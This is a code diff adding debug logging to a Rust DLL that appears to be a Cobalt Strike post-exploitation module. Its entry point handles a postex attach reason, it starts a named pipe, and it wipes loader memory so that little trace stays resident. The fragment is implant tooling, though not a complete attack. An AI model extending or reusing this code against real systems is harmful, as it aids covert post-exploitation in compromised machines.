@@ -39,6 +39,7 @@ static __ALLOC: rustbof::allocator::BeaconAlloc = rustbof::allocator::BeaconAllo
 mod args;
 mod beacon_api;
 mod cleanup;
+mod debug_log;
 mod pipes;
 mod postex;
 mod streamer;
@@ -91,16 +92,26 @@ pub unsafe extern "system" fn DllEntryPoint(
     start_named_pipe: BOOL,
 ) -> BOOL {
     unsafe {
+        debug_log::log_hex(b"[runner] DllEntryPoint reason=", ul_reason_for_call);
+        debug_log::log_hex(b"[runner]   hModule_lo=", h_module as usize as u32);
+        debug_log::log_hex(b"[runner]   lpReserved_lo=", lp_reserved as usize as u32);
+        debug_log::log_hex(b"[runner]   startNamedPipe=", start_named_pipe as u32);
         match ul_reason_for_call {
             DLL_PROCESS_ATTACH => {
+                debug_log::log(b"[runner] DLL_PROCESS_ATTACH branch");
                 LOADED_DLL_BASE.store(hmodule_to_void(h_module), Ordering::Relaxed);
             }
-            DLL_THREAD_ATTACH | DLL_THREAD_DETACH | DLL_PROCESS_DETACH => {}
+            DLL_THREAD_ATTACH | DLL_THREAD_DETACH | DLL_PROCESS_DETACH => {
+                debug_log::log(b"[runner] DLL_THREAD_* or PROCESS_DETACH (ignored)");
+            }
             r if r == DLL_POSTEX_ATTACH => {
+                debug_log::log(b"[runner] DLL_POSTEX_ATTACH branch entered");
                 run_postex(h_module, lp_reserved, start_named_pipe != 0);
                 // run_postex never returns — postex_exit calls ExitProcess.
             }
-            _ => {}
+            _ => {
+                debug_log::log_hex(b"[runner] UNKNOWN reason ", ul_reason_for_call);
+            }
         }
         1 // TRUE
     }
@@ -110,9 +121,14 @@ pub unsafe extern "system" fn DllEntryPoint(
 /// returns; reaches `postex_exit` which calls ExitProcess/ExitThread.
 unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pipe: bool) -> ! {
     unsafe {
+        debug_log::log(b"[runner] run_postex: entered");
+
         // 1. Snapshot POSTEX_ARGUMENTS — CS UDRL wrote this in just
         //    before invoking us.
         let pa = postex::read_postex_arguments();
+        debug_log::log_hex(b"[runner] PA.exit_func=", pa.exit_func);
+        debug_log::log_hex(b"[runner] PA.cleanup_loader=", pa.cleanup_loader as u32);
+        debug_log::log_hex(b"[runner] PA.user_args_size=", pa.user_argument_buffer_size as u32);
         let user_args_size = pa.user_argument_buffer_size;
         let user_args_ptr = if user_args_size > 0 && !lp_reserved.is_null() {
             lp_reserved
@@ -123,6 +139,7 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
         // 2. Best-effort loader cleanup (so the only resident allocation
         //    is our heap + smartinject's proxies).
         if pa.cleanup_loader > 0 {
+            debug_log::log(b"[runner] step 2: cleanup_loader_memory");
             let base = LOADED_DLL_BASE.load(Ordering::Relaxed);
             let cleanup_target = if !base.is_null() { base } else { hmodule_to_void(h_module) };
             // Ignore return value — failure just leaves the loader pages
@@ -135,8 +152,11 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
         //    smartinject proxies write to it; our streamer writes to it.
         //    If this fails we still try to run — orchestrator output gets
         //    lost but a hard exit is worse.
+        debug_log::log_hex(b"[runner] step 3: startNamedPipe=", start_named_pipe as u32);
         if start_named_pipe {
-            let _ = pipes::start_named_pipe_server();
+            debug_log::log(b"[runner]   calling start_named_pipe_server");
+            let ok = pipes::start_named_pipe_server();
+            debug_log::log_hex(b"[runner]   start_named_pipe_server returned=", ok as u32);
         }
 
         // 4. Parse orchestrator args from the user-arg buffer.
